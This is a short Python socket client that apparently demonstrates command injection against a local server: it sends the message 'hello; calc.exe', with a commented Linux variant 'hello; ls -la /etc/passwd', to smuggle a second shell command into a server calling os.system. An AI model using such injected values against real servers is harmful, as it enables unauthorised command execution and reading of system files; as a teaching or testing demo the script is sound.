import socket

def start_client():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '127.0.0.1'
    port = 65432

    try:
        client_socket.connect((host, port))
        
        # --- THE BUG: MALICIOUS PAYLOAD ---
        # Instead of a friendly message, we send a command injection payload.
        # This will trick the server's 'os.system' into opening the Calculator (on Windows)
        # or listing sensitive files (on Linux/Mac).
        buggy_message = "hello; calc.exe" # For Windows demo
        # buggy_message = "hello; ls -la /etc/passwd" # For Linux demo
        
        client_socket.sendall(buggy_message.encode('utf-8'))
        
        data = client_socket.recv(1024)
        print(f"Server Response: {data.decode('utf-8')}")
        
    finally:
        client_socket.close()

if __name__ == "__main__":
    start_client()
